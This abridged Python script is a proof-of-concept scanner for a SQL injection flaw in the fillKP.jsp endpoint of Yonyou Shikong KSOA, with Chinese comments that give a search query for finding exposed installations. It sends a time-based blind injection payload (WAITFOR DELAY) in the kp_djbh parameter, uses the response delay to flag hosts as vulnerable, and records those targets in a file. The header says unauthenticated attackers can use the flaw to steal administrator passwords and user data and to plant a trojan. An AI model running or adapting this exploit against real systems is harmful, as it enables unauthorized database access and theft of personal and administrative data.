# -*- coding: utf-8 -*-
# 用友时空KSOA fillKP.jsp SQL注入漏洞
# app="用友-时空KSOA"
# 产品简介:用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的 IT 需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的 IT 系统之间彼此轻松对话。
# 漏洞概述:用友时空KSOA系统 fillKP.jsp接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
...
def bunner():
    ...
    \x1b[33m╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝                                               
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                       
      --author:Kucei  --Vession:用友时空KSOA_fillKP.jsp_SQL注入
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)
...
def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("用友时空KSOA_fillKP.jsp_SQL注入")
...
def poc(target):
    url_payload1 = "/kp/fillKP.jsp?kp_djbh=1"
    url_payload2 = "/kp/fillKP.jsp?kp_djbh=1';WAITFOR+DELAY+'0:0:5'--"
    headers = {
    ...
    try :
        ...
        if response1.status_code == 200 and time2 - time1 >= 3.6:
            print( f"[+] {target} 存在漏洞！\n")
            with open('用友时空KSOA_fillKP_SQL.txt','a',encoding='utf-8')as f:
